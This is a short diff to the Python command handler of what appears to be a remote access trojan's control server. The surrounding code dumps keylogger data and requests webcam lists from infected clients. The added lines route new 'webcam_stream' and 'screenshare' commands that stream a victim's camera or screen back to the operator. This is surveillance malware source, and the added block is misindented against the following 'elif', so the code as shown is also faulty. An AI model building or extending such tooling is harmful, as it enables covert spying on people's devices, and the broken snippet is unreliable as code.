@@ -152,6 +152,11 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + dump_keylogger_data())
             continue
 
+      if command.startswith("webcam_stream") or command.startswith("screenshare"):
+            mode = command.split('_')[0]
+            start_streaming(client_socket, mode)
+            continue
+        
         elif command.startswith("webcam_list"):
             print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
             client_socket.send(command.encode('utf-8'))
